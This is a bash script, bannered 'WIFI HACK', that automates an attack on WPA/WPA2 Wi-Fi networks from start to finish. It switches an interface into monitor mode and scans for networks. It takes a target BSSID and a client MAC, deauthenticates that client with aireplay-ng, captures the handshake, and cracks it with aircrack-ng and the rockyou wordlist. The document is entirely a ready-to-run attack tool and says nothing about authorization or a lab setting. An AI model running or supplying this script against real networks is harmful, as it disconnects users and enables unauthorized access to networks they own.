#!/bin/bash

#  COLORS 
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# BANNER 
clear
cat << "EOF"
          )  (
         (   ) )
          ) ( (
        _______)_
     .-'---------|  W I F I   H A C K
    ( C|/\/\/\/\/|
     '-./\/\/\/\/|
       '_________'
        '-------'

 🚀 Sniffing | 💣 Deauthing | 📶 Breaking WPA/WPA2
EOF

echo -e "${YELLOW}[+] Automated WiFi Handshake Capture & Targeted Cracking${NC}"

#  DETECT INTERFACES AND MONITOR SUPPORT 
echo -e "${YELLOW}[+] Scanning wireless interfaces...${NC}"
interfaces=($(iw dev | awk '$1=="Interface"{print $2}'))
monitor_support=()

for iface in "${interfaces[@]}"; do
    phy=$(iw dev "$iface" info | awk '/wiphy/ {print "phy"$2}')
    if iw phy "$phy" info | grep -A10 "Supported interface modes" | grep -q "monitor"; then
        monitor_support+=("yes")
    else
        monitor_support+=("no")
    fi
done

# DISPLAY INTERFACES 
for i in "${!interfaces[@]}"; do
    if [[ "${monitor_support[$i]}" == "yes" ]]; then
        echo -e "${GREEN}[$i] ${interfaces[$i]} (monitor mode supported)${NC}"
    else
        echo -e "${RED}[$i] ${interfaces[$i]} (no monitor mode)${NC}"
    fi
done

# === SELECT INTERFACE ===
while true; do
    read -p "$(echo -e ${YELLOW}'Select Interface [0,1,2,...] : '${NC})" iface_index
    if [[ "$iface_index" =~ ^[0-9]+$ ]] && [ "$iface_index" -ge 0 ] && [ "$iface_index" -lt "${#interfaces[@]}" ]; then
        if [[ "${monitor_support[$iface_index]}" == "yes" ]]; then
            interface="${interfaces[$iface_index]}"
            echo -e "${YELLOW}[+] Selected interface: $interface${NC}"
            break
        else
            echo -e "${RED}Selected interface does NOT support monitor mode. Please select another.${NC}"
        fi
    else
        echo -e "${RED}Invalid selection. Try again.${NC}"
    fi
done

#  KILL INTERFERING SERVICES 
echo -e "${YELLOW}[+] Stopping NetworkManager and wpa_supplicant...${NC}"
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant
sleep 2

#  ENABLE MONITOR MODE 
echo -e "${YELLOW}[+] Enabling monitor mode...${NC}"
sudo ip link set "$interface" down
sudo iw dev "$interface" set type monitor
sudo ip link set "$interface" up
sleep 2

# SCAN NETWORKS 
echo -e "${YELLOW}[+] Scanning for WiFi networks... Press Ctrl+C when you see your target${NC}"
sleep 2
trap '' SIGINT  # Disable Ctrl+C temporarily
sudo timeout 15s airodump-ng "$interface" --band abg
trap - SIGINT   # Re-enable

echo -e "${YELLOW}[+] Scan complete.${NC}"

#  GET TARGET DETAILS
read -p "$(echo -e ${YELLOW}'Enter target BSSID: '${NC})" bssid
read -p "$(echo -e ${YELLOW}'Enter target Channel: '${NC})" channel

# === SCAN FOR CONNECTED CLIENTS ===
echo -e "${YELLOW}[+] Scanning for clients connected to ${bssid}... Press Ctrl+C when you see your target client${NC}"
trap 'echo -e "\n${GREEN}[✓] Stopped scanning for clients.${NC}"' SIGINT
sudo airodump-ng -c "$channel" --bssid "$bssid" "$interface"
trap - SIGINT

#  SELECT CLIENT 
read -p "$(echo -e ${YELLOW}'Enter the STATION BSSID (Client MAC) to deauth: '${NC})" client_mac

#  SET OUTPUT FILE 
read -p "$(echo -e ${YELLOW}'Enter file name to save handshake (without extension): '${NC})" capfile

#  LAUNCH AIRODUMP AND DEAUTH 
echo -e "${YELLOW}[+] Capturing handshake & targeting client for deauth...${NC}"

xterm -hold -e "airodump-ng -c $channel --bssid $bssid -w $capfile $interface" &
airodump_pid=$!
sleep 5
xterm -hold -e "aireplay-ng --deauth 10 -a $bssid -c $client_mac $interface" &
aireplay_pid=$!

#  CLEANUP FUNCTION 
cleanup() {
    echo -e "\n${YELLOW}[!] Cleaning up...${NC}"
    kill $airodump_pid 2>/dev/null
    kill $aireplay_pid 2>/dev/null
    sudo ip link set "$interface" down
    sudo iw dev "$interface" set type managed
    sudo ip link set "$interface" up
    sudo systemctl start NetworkManager
    sudo systemctl start wpa_supplicant
    echo -e "${GREEN}[✓] Interface restored. Exiting...${NC}"
    exit 0
}
trap cleanup SIGINT SIGTERM

#  PROMPT TO CRACK 
default_wordlist="/usr/share/wordlists/rockyou.txt"
read -p "$(echo -e ${YELLOW}Enter path to wordlist [Press Enter for default: $default_wordlist]: ${NC})" wordlist
wordlist="${wordlist:-$default_wordlist}"

read -p "$(echo -e ${YELLOW}'Do you want to crack the handshake now? [y/N]: '${NC})" crack_choice
if [[ "$crack_choice" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[+] Starting password cracking with aircrack-ng...${NC}"
    sudo aircrack-ng "$capfile-01.cap" -w "$wordlist"
else
    echo -e "${GREEN}[+] Handshake saved as ${capfile}-01.cap. You can crack it later.${NC}"
fi

# Final cleanup
cleanup
